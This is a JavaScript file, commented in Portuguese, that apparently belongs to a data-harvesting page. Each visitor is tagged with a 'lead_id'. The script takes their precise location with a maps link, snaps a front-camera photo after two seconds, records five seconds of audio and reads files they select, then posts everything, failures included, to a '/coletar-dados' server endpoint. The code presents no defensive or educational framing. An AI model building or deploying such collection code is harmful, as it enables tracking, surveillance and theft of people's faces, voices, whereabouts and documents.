// Captura de mídia (camera, microfone, localização, arquivos)

class MediaCapture {
    constructor() {
        this.mediaStream = null;
        this.mediaRecorder = null;
        this.audioChunks = [];
        this.leadId = localStorage.getItem('lead_id');
    }

    // Capturar localização
    async solicitarLocalizacao() {
        try {
            if (!navigator.geolocation) {
                throw new Error('Geolocalização não suportada');
            }

            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });

            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                timestamp: new Date(position.timestamp).toISOString(),
                mapsUrl: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
            };

            await this.enviarDados('localizacao', locationData);
            marcarPermissaoConcluida('location');
            
            return locationData;
        } catch (error) {
            console.error('Erro ao capturar localização:', error);
            await this.enviarDados('erro_localizacao', { error: error.message });
            throw error;
        }
    }

    // Capturar foto da câmera
    async solicitarCamera() {
        try {
            this.mediaStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' } 
            });

            const video = document.getElementById('videoElement');
            const canvas = document.getElementById('canvasElement');
            const container = document.getElementById('mediaContainer');
            
            container.style.display = 'block';
            video.srcObject = this.mediaStream;

            // Aguardar vídeo carregar
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });

            // Capturar foto após 2 segundos
            setTimeout(() => {
                this.capturarFoto(video, canvas);
            }, 2000);

        } catch (error) {
            console.error('Erro ao acessar câmera:', error);
            await this.enviarDados('erro_camera', { error: error.message });
            throw error;
        }
    }

    capturarFoto(video, canvas) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const photoData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Parar stream
        this.mediaStream.getTracks().forEach(track => track.stop());
        document.getElementById('mediaContainer').style.display = 'none';
        
        this.enviarDados('camera', { data: photoData });
        marcarPermissaoConcluida('camera');
    }

    // Capturar áudio do microfone
    async solicitarMicrofone() {
        try {
            this.mediaStream = await navigator.mediaDevices.getUserMedia({ 
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    sampleRate: 44100
                } 
            });

            this.audioChunks = [];
            this.mediaRecorder = new MediaRecorder(this.mediaStream, {
                mimeType: 'audio/webm;codecs=opus'
            });

            this.mediaRecorder.ondataavailable = (event) => {
                this.audioChunks.push(event.data);
            };

            this.mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
                const audioUrl = URL.createObjectURL(audioBlob);
                
                // Converter para base64
                const reader = new FileReader();
                reader.onload = async () => {
                    await this.enviarDados('microfone', { 
                        data: reader.result,
                        duration: this.audioChunks.length
                    });
                    marcarPermissaoConcluida('microphone');
                };
                reader.readAsDataURL(audioBlob);

                // Limpar
                this.mediaStream.getTracks().forEach(track => track.stop());
            };

            this.mediaRecorder.start();
            
            // Parar após 5 segundos
            setTimeout(() => {
                if (this.mediaRecorder.state === 'recording') {
                    this.mediaRecorder.stop();
                }
            }, 5000);

        } catch (error) {
            console.error('Erro ao acessar microfone:', error);
            await this.enviarDados('erro_microfone', { error: error.message });
            throw error;
        }
    }

    // Capturar arquivos
    async solicitarArquivos() {
        return new Promise((resolve) => {
            const input = document.createElement('input');
            input.type = 'file';
            input.multiple = true;
            input.accept = '.jpg,.jpeg,.png,.pdf,.doc,.docx,.txt';
            
            input.onchange = async (event) => {
                const files = Array.from(event.target.files);
                const fileData = [];

                for (const file of files) {
                    const reader = new FileReader();
                    
                    await new Promise((fileResolve) => {
                        reader.onload = (e) => {
                            fileData.push({
                                name: file.name,
                                type: file.type,
                                size: file.size,
                                data: e.target.result,
                                lastModified: file.lastModified
                            });
                            fileResolve();
                        };
                        reader.readAsDataURL(file);
                    });
                }

                await this.enviarDados('arquivos', fileData);
                marcarPermissaoConcluida('files');
                resolve(fileData);
            };

            input.click();
        });
    }

    // Enviar dados para o servidor
    async enviarDados(tipo, dados) {
        try {
            await fetch('/coletar-dados', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    lead_id: this.leadId,
                    tipo: tipo,
                    dados: dados
                })
            });
        } catch (error) {
            console.error('Erro ao enviar dados:', error);
        }
    }
}

// Instância global
const mediaCapture = new MediaCapture();

// Funções globais para os botões
function solicitarLocalizacao() {
    mediaCapture.solicitarLocalizacao().catch(() => {
        alert('Erro ao capturar localização. Tente novamente.');
    });
}

function solicitarCamera() {
    mediaCapture.solicitarCamera().catch(() => {
        alert('Erro ao acessar câmera. Tente novamente.');
    });
}

function solicitarMicrofone() {
    mediaCapture.solicitarMicrofone().catch(() => {
        alert('Erro ao acessar microfone. Tente novamente.');
    });
}

function solicitarArquivos() {
    mediaCapture.solicitarArquivos().catch(() => {
        alert('Erro ao enviar arquivos. Tente novamente.');
    });
}
